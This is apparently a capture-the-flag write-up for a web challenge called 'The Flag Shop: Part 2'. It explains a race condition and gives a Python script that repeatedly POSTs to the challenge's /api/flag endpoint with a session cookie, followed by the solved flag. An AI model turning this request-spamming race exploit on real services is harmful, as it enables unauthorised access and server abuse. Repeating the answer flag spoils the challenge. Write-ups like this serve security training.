## The Flag Shop: Part 2 - 100 (Web Exploitation) ##

#### Write-up by Oksisane


### Problem ###

A bit harder. http://flagshop2.problem.sctf.io

### Hint ###
Time is precious. Never waste it.

## Answer ##

### Overview ###

Spam requests to `/api/flag` and refresh the account page.

### Details ###

Looking at the source of flagshop2, the only change is this new code
```js
$.post("/api/flag", function() {
	display_message("#unlock_msg", "success", "done.");
});
```
Looks like the `/api/flag/unlock` and `/api/flag/delete` are done server side now. We need a way to beat the server to the flag! The way I did it is by spamming requests to `/api/flag` using Python. Here's the source:
```python
import requests,time

flagurl = "http://flagshop2.problem.sctf.io/api/flag/"
payload = ""
headers = {
    'cookie': "sid=s%3Arygx5swsocb5g3gylg3qhh7gk.exfuOQEV4ou6S%2Fb2QppzLiYukQWHqfFGHwVtuS7wDdM; email=s%3Aehsan%40blah.com.s2ROHWeVypYBnyikyx7aWY4ShzelKWs65JUMvzGsBzk"
 }

def requestFlag():
    response = requests.request("POST", flagurl, data=payload, headers=headers)
    print response.text\

while True:
    requestFlag()
    #sleep .1 to be nice :)
    time.sleep(.1)
```

The cookie header is used so the site still knows who we are logged in as. Running the script and refreshing the page a few times gives the flag.

### Flag ###

	flag{4f8703d93bdb7b46615e498d}
